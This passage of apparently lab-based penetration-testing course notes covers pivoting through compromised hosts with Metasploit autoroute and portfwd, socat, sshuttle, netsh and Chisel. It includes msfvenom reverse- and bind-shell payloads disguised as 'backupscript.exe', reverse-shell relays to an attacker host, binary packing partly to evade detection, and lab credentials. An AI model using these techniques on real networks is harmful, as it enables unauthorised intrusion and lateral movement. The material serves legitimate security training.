       SRVHOST  0.0.0.0          yes       The address to listen on
       SRVPORT  9050             yes       The port to listen on
       VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                            5)
    
    
    Auxiliary action:
    
       Name   Description
       ----   -----------
       Proxy  Run a SOCKS proxy server
    

#### Confirming Proxy Server is Running

    msf6 auxiliary(server/socks_proxy) > jobs
    
    Jobs
    ====
    
      Id  Name                           Payload  Payload opts
      --  ----                           -------  ------------
      0   Auxiliary: server/socks_proxy
    

After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our `proxychains.conf` file located at `/etc/proxychains.conf` if it isn't already there.

#### Adding a Line to proxychains.conf if Needed

    socks4 	127.0.0.1 9050
    

Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

Finally, we need to tell our socks\_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

#### Creating Routes with AutoRoute

    msf6 > use post/multi/manage/autoroute
    
    msf6 post(multi/manage/autoroute) > set SESSION 1
    SESSION => 1
    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
    SUBNET => 172.16.5.0
    msf6 post(multi/manage/autoroute) > run
    
    [!] SESSION may not be compatible with this module:
    [!]  * incompatible session platform: linux
    [*] Running module against 10.129.202.64
    [*] Searching for subnets to autoroute.
    [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
    [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
    [*] Post module execution completed
    

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

    meterpreter > run autoroute -s 172.16.5.0/23
    
    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    [*] Adding a route to 172.16.5.0/255.255.254.0...
    [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
    [*] Use the -p option to list all active routes
    

After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.

#### Listing Active Routes with AutoRoute

    meterpreter > run autoroute -p
    
    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    
    Active Routing Table
    ====================
    
       Subnet             Netmask            Gateway
       ------             -------            -------
       10.129.0.0         255.255.0.0        Session 1
       172.16.4.0         255.255.254.0      Session 1
       172.16.5.0         255.255.254.0      Session 1
    

As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.

#### Testing Proxy & Routing Functionality

    matmarqx@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
    
    ProxyChains-3.1 (http://proxychains.sf.net)
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
    Initiating Parallel DNS resolution of 1 host. at 13:40
    Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
    Initiating Connect Scan at 13:40
    Scanning 172.16.5.19 [1 port]
    |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
    Discovered open port 3389/tcp on 172.16.5.19
    Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
    Nmap scan report for 172.16.5.19 
    Host is up (0.12s latency).
    
    PORT     STATE SERVICE
    3389/tcp open  ms-wbt-server
    
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
    

## Port Forwarding

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

#### Portfwd options

    meterpreter > help portfwd
    
    Usage: portfwd [-h] [add | delete | list | flush] [args]
    
    
    OPTIONS:
    
        -h        Help banner.
        -i <opt>  Index of the port forward entry to interact with (see the "list" command).
        -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
        -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
        -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
        -r <opt>  Forward: remote host to connect to.
        -R        Indicates a reverse port forward.
    

#### Creating Local TCP Relay

    meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
    
    [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
    

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

#### Connecting to Windows Target through localhost

    matmarqx@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
    

#### Netstat Output

We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.

    matmarqx@htb[/htb]$ netstat -antp
    
    tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
    

## Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`. We will also configure our listener to listen on port 8081 for a Windows shell.

#### Reverse Port Forwarding Rules

    meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
    
    [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
    

#### Configuring & Starting multi/handler

    meterpreter > bg
    
    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LPORT 8081 
    LPORT => 8081
    msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
    LHOST => 0.0.0.0
    msf6 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 0.0.0.0:8081 
    

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

#### Generating the Windows Payload

    matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 510 bytes
    Final size of exe file: 7168 bytes
    Saved as: backupscript.exe
    

Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

#### Establishing the Meterpreter session

    [*] Started reverse TCP handler on 0.0.0.0:8081 
    [*] Sending stage (200262 bytes) to 10.10.14.18
    [*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
    
    meterpreter > shell
    Process 2336 created.
    Channel 1 created.
    Microsoft Windows [Version 10.0.17763.1637]
    (c) 2018 Microsoft Corporation. All rights reserved.
    
    C:\>

# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start `socat` on the Ubuntu server.

#### Starting Socat Listener

    ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
    

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

#### Creating the Windows Payload

    matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 743 bytes
    Final size of exe file: 7168 bytes
    Saved as: backupscript.exe
    

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.

#### Starting MSF Console

    matmarqx@htb[/htb]$ sudo msfconsole
    
    <SNIP>
    

#### Configuring & Starting the multi/handler

    msf6 > use exploit/multi/handler
    
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 80
    lport => 80
    msf6 exploit(multi/handler) > run
    
    [*] Started HTTPS reverse handler on https://0.0.0.0:80
    

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

#### Establishing the Meterpreter Session

    [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
    [*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
    [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
    [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500
    
    meterpreter > getuid
    Server username: INLANEFREIGHT\victor

## Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.

![Diagram showing network setup: Attack Host (10.10.15.5) uses Metasploit Handler. Victim Server (Ubuntu) listens on port 8080, forwards to 172.16.5.19:8443. Victim Server (Windows A) has a Bind Shell on port 8443.](fig/socat_bind_shell.png)

We can create a bind shell using msfvenom with the below command.

#### Creating the Windows Payload

    matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 499 bytes
    Final size of exe file: 7168 bytes
    Saved as: backupjob.exe
    

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

#### Starting Socat Bind Shell Listener

    ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
    

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

#### Configuring & Starting the Bind multi/handler

    msf6 > use exploit/multi/handler
    
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
    payload => windows/x64/meterpreter/bind_tcp
    msf6 exploit(multi/handler) > set RHOST 10.129.202.64
    RHOST => 10.129.202.64
    msf6 exploit(multi/handler) > set LPORT 8080
    LPORT => 8080
    msf6 exploit(multi/handler) > run
    
    [*] Started bind TCP handler against 10.129.202.64:8080
    

We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.

#### Establishing Meterpreter Session

    [*] Sending stage (200262 bytes) to 10.129.202.64
    [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
    
    meterpreter > getuid
    Server username: INLANEFREIGHT\victor


## SSH Pivoting with Sshuttle

[Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.

To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

#### Running sshuttle

    matmarqx@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
    
    Starting sshuttle proxy (version 1.1.0).
    c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
    fw: Starting firewall with Python version 3.9.2
    fw: ready method name nat.
    c : IPv6 enabled: Using default IPv6 listen address ::1
    c : Method: nat
    c : IPv4: on
    c : IPv6: on
    c : UDP : off (not available with nat method)
    c : DNS : off (available)
    c : User: off (available)
    c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
    c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
    c : Subnets to exclude from forwarding:
    c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
    c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
    c : TCP redirector listening on ('::1', 12300, 0, 0).
    c : TCP redirector listening on ('127.0.0.1', 12300).
    c : Starting client with Python version 3.9.2
    c : Connecting to server...
    ubuntu@10.129.202.64's password: 
     s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
     s: latency control setting = True
     s: auto-nets:False
    c : Connected to server.
    fw: setting up.
    fw: ip6tables -w -t nat -N sshuttle-12300
    fw: ip6tables -w -t nat -F sshuttle-12300
    fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
    fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
    fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
    fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
    fw: iptables -w -t nat -N sshuttle-12300
    fw: iptables -w -t nat -F sshuttle-12300
    fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
    fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
    fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
    fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
    fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
    

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

#### Traffic Routing through iptables Routes

    matmarqx@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
    
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST
    NSE: Loaded 155 scripts for scanning.
    NSE: Script Pre-scanning.
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating Parallel DNS resolution of 1 host. at 11:16
    Completed Parallel DNS resolution of 1 host. at 11:16, 0.15s elapsed
    Initiating Connect Scan at 11:16
    Scanning 172.16.5.19 [1 port]
    Completed Connect Scan at 11:16, 2.00s elapsed (1 total ports)
    Initiating Service scan at 11:16
    NSE: Script scanning 172.16.5.19.
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Nmap scan report for 172.16.5.19
    Host is up.
    
    PORT     STATE SERVICE       VERSION
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: INLANEFREIGHT
    |   NetBIOS_Domain_Name: INLANEFREIGHT
    |   NetBIOS_Computer_Name: DC01
    |   DNS_Domain_Name: inlanefreight.local
    |   DNS_Computer_Name: DC01.inlanefreight.local
    |   Product_Version: 10.0.17763
    |_  System_Time: 2022-08-14T02:58:25+00:00
    |_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.
    | ssl-cert: Subject: commonName=DC01.inlanefreight.local
    | Issuer: commonName=DC01.inlanefreight.local
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-08-13T02:51:48
    | Not valid after:  2023-02-12T02:51:48
    | MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b
    |_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: 6s, deviation: 0s, median: 6s
    
    
    NSE: Script Post-scanning.
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Initiating NSE at 11:16
    Completed NSE at 11:16, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 4.07 seconds
    

We can now use any tool directly without using proxychains.

## Port Forwarding with Windows Netsh

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

*   `Finding routes`
*   `Viewing the firewall configuration`
*   `Adding proxies`
*   `Creating port forwarding rules`

Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`, `172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.

![Diagram showing an RDP request from Attack Host (10.10.15.5) to Windows Server (172.16.5.25) via Windows10 User (10.129.15.150) using Netsh.exe. The request listens on port 8080 and forwards to port 3389.](fig/windows_portfwd.png)

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

#### Using Netsh.exe to Port Forward

    C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
    

#### Verifying Port Forward

    C:\Windows\system32> netsh.exe interface portproxy show v4tov4
    
    Listen on ipv4:             Connect to ipv4:
    
    Address         Port        Address         Port
    --------------- ----------  --------------- ----------
    10.129.42.198   8080        172.16.5.25     3389
    

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

#### Connecting to the Internal Host through the Port Forward

![Terminal showing xfreerdp command connecting to 10.129.42.198:8080 with user 'victor' and password 'pass@123'. Below, a Windows Command Prompt displays IP configuration for Ethernet adapter, showing IPv4 address 172.16.5.19.](fig/netsh_pivot.png)


## SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

Setting Up & Using Chisel
-------------------------

Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:

#### Cloning Chisel

    matmarqx@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
    

We will need the programming language `Go` installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use `go build` to build the Chisel binary.

**Note:** Depending on the version of the `glibc` library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.

#### Building the Chisel Binary

    matmarqx@htb[/htb]$ cd chisel
    go build
    CGO_ENABLED=0 go build -o chisel -ldflags="-s -w"   # static binary
    upx brute chisel    # Ultimate Packer for eXecutables: reduce size

    

It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)" and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).

Once the binary is built, we can use `SCP` to transfer it to the target pivot host.

#### Transferring Chisel Binary to Pivot Host

    matmarqx@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
     
    ubuntu@10.129.202.64's password: 
    chisel                                        100%   11MB   1.2MB/s   00:09    
    

Then we can start the Chisel server/listener.

#### Running the Chisel Server on the Pivot Host

    ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
    
    2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
    2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
    

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

We can start a client on our attack host and connect to the Chisel server.

#### Connecting to the Chisel Server

    matmarqx@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
    
    2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
    2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
    2022/05/05 14:21:18 client: tun: Bound proxies
    2022/05/05 14:21:19 client: Handshaking...
    2022/05/05 14:21:19 client: Sending config
    2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
    2022/05/05 14:21:19 client: tun: SSH connected
    

As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

#### Editing & Confirming proxychains.conf

We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

    matmarqx@htb[/htb]$ tail -f /etc/proxychains.conf 
    
    #
    #       proxy types: http, socks4, socks5
    #        ( auth types supported: "basic"-http  "user/pass"-socks )
    #
    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    # socks4 	127.0.0.1 9050
    socks5 127.0.0.1 1080
    

Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

#### Pivoting to the DC

SOCKS5 Tunneling with Chisel

    matmarqx@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
    

## Chisel Reverse Pivot

In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

We'll start the server in our attack host with the option `--reverse`.

#### Starting the Chisel Server on our Attack Host

    matmarqx@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
    
    2022/05/30 10:19:16 server: Reverse tunnelling enabled
    2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
    2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
    

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

#### Connecting the Chisel Client to our Attack Host

    ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
    
    2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
    2022/05/30 14:19:29 client: Handshaking...
    2022/05/30 14:19:30 client: Sending config
    2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
    2022/05/30 14:19:30 client: tun: SSH connected
    

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

#### Editing & Confirming proxychains.conf

    matmarqx@htb[/htb]$ tail -f /etc/proxychains.conf 
    
    [ProxyList]
    # add proxy here ...
    # socks4    127.0.0.1 9050
    socks5 127.0.0.1 1080 
    

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

    matmarqx@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
